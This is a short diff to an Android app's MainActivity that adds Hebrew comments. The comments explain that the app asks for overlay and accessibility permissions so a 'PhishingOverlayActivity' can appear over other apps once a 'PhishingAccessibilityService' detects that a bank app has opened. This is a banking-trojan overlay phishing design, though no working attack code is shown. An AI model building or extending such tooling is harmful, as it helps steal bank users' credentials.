@@ -11,9 +11,15 @@ import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
+//זו ה־Activity הראשית של האפליקציה, שמשמשת לשגר את המשתמש להעניק הרשאות קריטיות לפעולת ה-framework:
+//הרשאת Overlay – כדי לאפשר הצגת ה־PhishingOverlayActivity מעל אפליקציות אחרות.
+//הפעלת שירות הנגישות – כדי לאפשר ל־PhishingAccessibilityService לקבל אירועי שינוי חלון ולזהות פתיחת אפליקציית הבנק.
+
 class MainActivity : AppCompatActivity() {
 
+    //מנטר את תוצאת הבקשה להרשאת “הצג מעל אפליקציות אחרות”
     private lateinit var overlayRequestLauncher: ActivityResultLauncher<Intent>
+    // מנטר את תוצאת הבקשה להפעיל את שירות הנגישות
     private lateinit var accessibilityRequestLauncher: ActivityResultLauncher<Intent>
 
     override fun onCreate(savedInstanceState: Bundle?) {
